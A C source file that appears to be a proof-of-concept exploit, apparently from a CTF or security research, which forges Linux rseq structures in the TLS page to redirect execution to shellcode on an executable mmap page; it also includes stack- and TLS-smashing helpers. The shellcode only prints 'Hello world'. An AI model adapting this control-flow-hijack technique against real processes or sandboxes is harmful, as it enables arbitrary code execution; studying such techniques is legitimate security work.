#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/mman.h>
#include <string.h>

#include "main.h"


#define SIZE (1 << 16)
void *jit;
#define TLS_PAGE_SIZE 0x3000
#define TLS_OFFSET 0x740
#define RSEQ_OFFSET 0x680

#define RSEQ_SIG        0x53053053

#define SLEEP_OFFSET 0xf8d30
#define SLEEP_SIZE 106
#define LIBC_TEXT_OFFSET 0x28000
#define LIBC_TEXT_SIZE 0x16500


/*
xor edi, edi
xor eax, eax
mov edx, 0x30
call next
next:
pop rsi
syscall
*/

const unsigned char shellcode[] = { 0x31, 0xFF, 0x31, 0xC0, 0xFF, 0xC0, 0xFF, 0xC7, 0xBA, 0x30, 0x00, 0x00, 0x00, 0xE8, 0x00, 0x00, 0x00, 0x00, 0x5E, 0x0F, 0x05 } ;

[[noreturn]]
static void panic(void)
{
	static const char str[] = "\x1B[31mError\x1B[0m: too much maths\n"
		"Starting emergency procedure\n";
	write(STDOUT_FILENO, str, __builtin_strlen(str));

	sleep(3);

	_exit(EXIT_FAILURE);
	asm("hlt");
}

#define DO_LOOP_VERBOSE 0
#if DO_LOOP_VERBOSE
#define DO_LOOP_SIZE 0x48
#else
#define DO_LOOP_SIZE 29
#endif


void do_loop() {
#if DO_LOOP_VERBOSE
    int i = 0;
#endif
    while (1) {
#if DO_LOOP_VERBOSE
        printf("loop %d\n", i);
        sleep(1);
        i ++;
#endif
    };
}

#define USE_SLEEP 1
#if USE_SLEEP
#define START_IP (libc + LIBC_TEXT_OFFSET)
#define REGION_SIZE LIBC_TEXT_SIZE
#else
#define START_IP do_loop
#define REGION_SIZE DO_LOOP_SIZE
#endif

void rseq_attack() {
    puts("Setup start");
    void *tls_page = jit + SIZE;
    void *libc = tls_page + TLS_PAGE_SIZE;
    struct rseq *rseq = tls_page + RSEQ_OFFSET;
    struct rseq_cs *rseq_cs = jit + 0x100;
    *(uint32_t *)jit = RSEQ_SIG;

    if (1) {
        //shellcode : print stuff
        memcpy(jit + 4, shellcode, sizeof(shellcode));
        memcpy(jit + 4 +sizeof(shellcode), "Hello world", 12);
    } else {
        //infinite loop
        ((unsigned char *)jit)[4] = 0xeb;
        ((unsigned char *)jit)[5] = 0xfe;
    }
    
    rseq_cs->abort_ip = (uint64_t)jit + 4;
    rseq_cs->start_ip = (uint64_t)START_IP;
    rseq_cs->post_commit_offset = 0x1000000000UL;
    //rseq_cs->version = 0x80000000;
    //rseq_cs->flags = 0xb8485080;

    rseq->cpu_id_start = 0x0148585a;
    rseq->cpu_id = 0x006850d0;
    //rseq->flags = 0xb8485080;
    rseq->node_id = 0x585a5001;
    rseq->mm_cid = 0x50d00148;


    rseq->rseq_cs = (uint64_t)rseq_cs;

    puts("Setup ready");
#if USE_SLEEP == 0
    do_loop();
#endif
}

void smash_stack() {
    uint64_t x;
    uint64_t *p = &x;
    p[2] = 0xdeadbeef;
}

void smash_tls() {
    void *tls_page = jit + SIZE;
    uint64_t *tls = tls_page + TLS_OFFSET;
    //tls[5] = 0xcacacaca;
    tls[6] ^= 0xdeadbeefdeadbeefUL;
    //tls[4] = 0xdeadbeef;
}

int main() {
    jit = mmap(NULL, SIZE, PROT_READ | PROT_WRITE | PROT_EXEC,
		MAP_ANONYMOUS | MAP_PRIVATE, -1, 0);

	if(MAP_FAILED == jit) {
		perror("mmap");
		return EXIT_FAILURE;
	}

	printf("JIT page @ %p\n", jit);
    rseq_attack();
    //smash_tls();
    panic();
    return 0;
}